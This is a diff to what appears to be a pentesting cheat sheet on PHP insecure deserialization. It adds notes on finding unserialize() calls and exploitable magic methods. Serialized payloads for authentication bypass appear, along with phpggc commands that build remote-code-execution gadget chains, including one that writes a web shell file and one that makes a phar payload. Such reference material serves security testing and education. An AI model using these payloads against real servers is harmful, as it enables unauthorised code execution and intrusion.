@@ -15,8 +15,8 @@ Also you should check the `Wrapper Phar://` in [File Inclusion](https://github.c
 * [General concept](#general-concept)
 * [Authentication bypass](#authentication-bypass)
 * [Finding and using gadgets](#finding-and-using-gadgets)
-* [Real world examples](#real-world-examples)
 * [PHP Phar Deserialization](#php-phar-deserialization)
+* [Real world examples](#real-world-examples)
 * [References](#references)
 
 ## General concept
@@ -111,7 +111,7 @@ Payload:
 O:6:"Object":2:{s:10:"secretCode";N;s:4:"guess";R:2;}
 ```
 
-We can do an array to like this:
+We can do an array like this:
 
 ```php
 a:2:{s:10:"admin_hash";N;s:4:"hmac";R:2;}
@@ -121,7 +121,14 @@ a:2:{s:10:"admin_hash";N;s:4:"hmac";R:2;}
 
 Also called `"PHP POP Chains"`, they can be used to gain RCE on the system.
 
-[PHPGGC](https://github.com/ambionics/phpggc) is a tool built to generate the payload based on several frameworks:
+* In PHP source code, look for `unserialize()` function.
+* Interesting [Magic Methods](https://www.php.net/manual/en/language.oop5.magic.php) such as `__construct()`, `__destruct()`, `__call()`, `__callStatic()`, `__get()`, `__set()`, `__isset()`, `__unset()`, `__sleep()`, `__wakeup()`, `__serialize()`, `__unserialize()`, `__toString()`, `__invoke()`, `__set_state()`, `__clone()`, and `__debugInfo()`:
+    * `__construct()`: PHP class constructor, is automatically called upon object creation
+    * `__destruct()`: PHP class destructor, is automatically called when references to the object are removed from memory
+    * `__toString()`: PHP call-back that gets executed if the object is treated like a string
+    * `__wakeup()` PHP call-back that gets executed upon deserialization
+
+[ambionics/phpggc](https://github.com/ambionics/phpggc) is a tool built to generate the payload based on several frameworks:
 
 - Laravel
 - Symfony
@@ -133,6 +140,8 @@ Also called `"PHP POP Chains"`, they can be used to gain RCE on the system.
 
 ```powershell
 phpggc monolog/rce1 'phpinfo();' -s
+phpggc monolog/rce1 assert 'phpinfo()'
+phpggc swiftmailer/fw1 /var/www/html/shell.php /tmp/data
 phpggc Monolog/RCE2 system 'id' -p phar -o /tmp/testinfo.ini
 ```
 
